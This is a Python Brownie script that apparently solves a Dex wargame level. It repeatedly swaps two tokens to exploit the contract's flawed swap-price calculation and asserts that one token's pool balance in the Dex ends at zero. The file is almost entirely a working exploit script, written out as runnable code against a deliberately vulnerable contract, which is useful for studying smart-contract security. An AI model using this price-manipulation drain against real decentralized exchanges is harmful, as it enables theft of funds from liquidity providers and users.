#!/usr/bin/python3
from brownie import Dex, accounts
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import convert, get_account

# sepolia: 0x48ca9022d108B5B9FA4295FF63838BdDC932eF4F
# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def attack(contract_address=None, attacker=None):
    if not contract_address:
        dex, owner, TKN1, TKN2 = deploy()
        contract_address = dex.address
        _, attacker = get_account()
        # transfer 10 of each token to attacker

        TKN1.transfer(attacker, 10, {"from": owner})
        TKN2.transfer(attacker, 10, {"from": owner})

        # print(TKN1.balanceOf(attacker))
        # print(TKN2.balanceOf(attacker))
    else:
        dex = Dex.at(contract_address)
        attacker = get_account()
        if attacker is None:
            attacker = accounts[1]
        TKN1 = "0xcc4264b773d6987436706540ae1312e8f5c4b8ff"
        TKN2 = "0xE39534f7aFa9d894fA233bDF507DE89640EdBbDa"

        # print(dex.balanceOf(TKN1, attacker))
        # print(dex.balanceOf(TKN2, attacker))

        # print(dex.balanceOf(TKN1.address, dex.address))

    # approve the dex
    dex.approve(dex.address, 1000, {"from": attacker}).wait(1)
    # print(f"{green}TKN1: {red}", dex.getSwapPrice(TKN2, TKN1, 1, {"from": attacker}))
    # print(f"{green}TKN2: {red}", dex.getSwapPrice(TKN1, TKN2, 1, {"from": attacker}))

    dex.swap(TKN2, TKN1, 10, {"from": attacker}).wait(1)
    print(f"{green}T1 balance: {red}", dex.balanceOf(TKN1, attacker), reset)
    print(f"{green}T2 balance: {red}", dex.balanceOf(TKN2, attacker), reset)

    dex.swap(TKN1, TKN2, dex.balanceOf(TKN1, attacker), {"from": attacker}).wait(1)
    print(f"{green}T1 balance: {red}", dex.balanceOf(TKN1, attacker), reset)
    print(f"{green}T2 balance: {red}", dex.balanceOf(TKN2, attacker), reset)

    dex.swap(TKN2, TKN1, dex.balanceOf(TKN2, attacker), {"from": attacker}).wait(1)

    print(f"{green}T1 balance: {red}", dex.balanceOf(TKN1, attacker), reset)
    print(f"{green}T2 balance: {red}", dex.balanceOf(TKN2, attacker), reset)

    dex.swap(TKN1, TKN2, dex.balanceOf(TKN1, attacker), {"from": attacker}).wait(1)

    print(f"{green}T1 balance: {red}", dex.balanceOf(TKN1, attacker), reset)
    print(f"{green}T2 balance: {red}", dex.balanceOf(TKN2, attacker), reset)

    dex.swap(TKN2, TKN1, dex.balanceOf(TKN2, attacker), {"from": attacker}).wait(1)

    print(f"{green}T1 balance: {red}", dex.balanceOf(TKN1, attacker), reset)
    print(f"{green}T2 balance: {red}", dex.balanceOf(TKN2, attacker), reset)

    dex.swap(TKN1, TKN2, dex.balanceOf(TKN1, dex.address), {"from": attacker}).wait(1)

    print(f"{green}T1 balance: {red}", dex.balanceOf(TKN1, attacker), reset)
    print(f"{green}T2 balance: {red}", dex.balanceOf(TKN2, attacker), reset)

    print(
        f"{green}T1 balance in Dex: {red}",
        dex.balanceOf(TKN1, dex.address),
        reset,
    )
    print(
        f"{green}T2 balance in Dex: {red}",
        dex.balanceOf(TKN2, dex.address),
        reset,
    )

    # exit(1)
    assert (
        dex.balanceOf(TKN1, dex.address) == 0 or dex.balanceOf(TKN2, dex.address) == 0
    )


def main(contract_address=None, attacker=None):
    if contract_address:
        attack(contract_address, get_account())
    else:
        attack()


if __name__ == "__main__":
    main()
